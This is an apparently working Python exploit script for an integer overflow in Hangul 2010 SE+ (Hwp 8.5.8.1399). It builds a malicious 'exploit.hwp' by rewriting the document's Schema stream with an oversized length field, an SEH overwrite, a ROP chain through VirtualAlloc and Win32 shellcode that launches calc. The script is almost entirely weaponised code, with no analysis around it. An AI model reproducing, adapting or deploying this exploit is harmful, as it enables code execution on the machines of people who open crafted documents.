"""
Author 	: Jakkdu@GoN
Date 		: 2014.02.06
Description	: Hangul 2010 SE+ XMLTemplate integer overflow
Target version : 8.5.8.1399
"""


from pythoncom import *
import sys, zlib, struct

# STGM constants
STGM_READ 			= 0x00000000
STGM_READWRITE 		= 0x00000002
STGM_SHARE_EXCLUSIVE 	= 0x00000010
STGM_CONVERT 			= 0x00020000
STGM_CREATE			= 0x00001000

# STGC constants
STGC_DEFAULT			= 0x0

# STGTY constants
STGTY_STORAGE			= 0x1
STGTY_STREAM			= 0x2 
STGTY_LOCKBYTES		= 0x3
STGTY_PROPERTY			= 0x4

# (sub esp, 0x7f) * 4 + WIN32 calc
shellcode = "\x90\x83\xc4\x7f"*4 + "\xd9\xeb\x9b\xd9\x74\x24\xf4\x5d\x56\x31\xc0\x31\xdb\xb3\x30\x64\x8b\x03\x8b\x40\x0c\x8b\x40\x14\x50\x5e\x8b\x06\x50\x5e\x8b\x06\x8b\x40\x10\x5e\x89\xc2\x68\x98\xfe\x8a\x0e\x52\x89\xeb\x81\xc3\x79\x11\x11\x11\x81\xeb\x11\x11\x11\x11\xff\xd3\x68\x20\x20\x20\x58\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe6\x31\xc9\x88\x4e\x08\x41\x51\x56\xff\xd0\x58\x58\x58\x5a\x68\x7e\xd8\xe2\x73\x52\xff\xd3\x31\xc9\x51\xff\xd0\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x37\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x0a\xc1\xcf\x0d\x01\xc7\xe9\xf1\xff\xff\xff\x3b\x7c\x24\x28\x75\xde\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3"

def zlib_inflate(data):
	return zlib.compress(data)[2:-4]

def zlib_deflate(data):
	return zlib.decompress(data, -15)

def create_rop_chain():

	# rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x1900add3,  # POP EAX # RETN [HncBD80.dll] 
      0x006a5198,  # ptr to &VirtualAlloc() [IAT Hwp.exe]
      0x19002F10,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [HncBD80.dll] 
      0x19089DE7,  # XCHG EAX,ESI # RETN [HncBD80.dll] 
      0x19002261,  # POP EBP # RETN [HncBD80.exe] 
      0x12036fe8,  # & call esp [HncXerCore8.dll]
      0x1900232E,  # POP EBX # RETN [HncBD80.dll] 
      0x00000001,  # 0x00000001-> ebx
      0x2004ae32,  # POP EDX # RETN [HwpABase.dll] 
      0x00001000,  # 0x00001000-> edx
      0x1900198D,  # POP ECX # RETN [HncBD80.exe] 
      0x00000040,  # 0x00000040-> ecx
      0x19005938,  # POP EDI # RETN [HncBD80.dll] 
      0x19005939,  # RETN (ROP NOP) [HncBD80.dll]
      0x190973a7,  # POP EAX # RETN [HncBD80.dll] 
      0x90909090,  # nop
      0x1902073C,  # PUSHAD # RETN [HncBD80.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

def modify_schema(dst_strm, src_strm):
	print "[*] Modify Schema stream"
	
	stat = src_strm.Stat(STGC_DEFAULT)
	docinfo = zlib_deflate(src_strm.Read(stat[2]))
	
	payload = struct.pack('<I', 0x19081f25) * 31
	payload += struct.pack('<I', 0x1908afed) * 3 # SEH handler
	payload += struct.pack('<I', 0x18018c09) * 55 + create_rop_chain() + shellcode
	payload = payload.ljust(100000, "A")
	
	data = struct.pack('<I', 0xffffffff) + payload
	
	dst_strm.Write(zlib_inflate(data))


def exploit(dst_stg, src_stg):
	if src_stg == None or dst_stg == None:
		print "[*] Invalid storage."
		sys.exit(-1)

	enum = src_stg.EnumElements()

	for stat in enum:
		if stat[1] == STGTY_STORAGE:
			# Storage
			name = stat[0]
			sub_src_stg = src_stg.OpenStorage(name, None, STGM_READ | STGM_SHARE_EXCLUSIVE, None, 0)
			sub_dst_stg = dst_stg.CreateStorage(name, STGM_READWRITE | STGM_CREATE | STGM_SHARE_EXCLUSIVE, 0, 0)
			exploit(sub_dst_stg, sub_src_stg)

		elif stat[1] == STGTY_STREAM:
			name = stat[0]
			src_strm = src_stg.OpenStream(name, None, STGM_READ | STGM_SHARE_EXCLUSIVE, 0)
			dst_strm = dst_stg.CreateStream(name, STGM_READWRITE | STGM_CREATE | STGM_SHARE_EXCLUSIVE, 0, 0)

			if (src_strm == None or dst_strm == None):
				print "[*] Invalid stream."
				sys.exit(-1)
			
			if name == "Schema":
				modify_schema(dst_strm, src_strm)
				continue
			
			src_strm.CopyTo(dst_strm, stat[2])



if __name__ == '__main__':
	print "[*] Start exploit."
	
	src_stg = StgOpenStorage("sample.hwp", None, (STGM_READWRITE | STGM_SHARE_EXCLUSIVE), None, 0)
	dst_stg = StgCreateDocfile('exploit.hwp', (STGM_READWRITE | STGM_SHARE_EXCLUSIVE |  STGM_CREATE), 0)

	exploit(dst_stg, src_stg)

	dst_stg.Commit(STGC_DEFAULT)

	print "[*] End exploit"